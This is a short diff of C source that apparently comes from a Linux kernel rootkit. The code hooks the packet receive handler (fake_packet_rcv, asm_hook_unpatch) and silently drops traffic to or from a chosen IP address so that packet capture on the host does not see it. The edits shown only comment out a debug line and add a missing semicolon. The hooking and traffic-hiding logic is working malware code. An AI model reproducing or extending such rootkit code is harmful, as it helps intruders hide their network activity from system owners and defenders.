@@ -96,7 +96,7 @@ int packet_check(struct sk_buff *skb)
 			|| find_packet_ipv4((u8 *)&header->daddr)) {
 		*/
 		if(header->saddr == drop_ip || header->daddr == drop_ip){
-			debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
+			//debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
 
 			/* ip in list, should be hidden */
 			return 1;
@@ -130,7 +130,7 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	*/
 	
 	int (*original_packet_rcv)(struct sk_buff *, struct net_device *, 
-	struct packet_type *, struct net_device *)
+	struct packet_type *, struct net_device *);
 		
 	original_packet_rcv = asm_hook_unpatch(fake_packet_rcv);
 	ret = original_packet_rcv(skb, dev, pt, orig_dev);
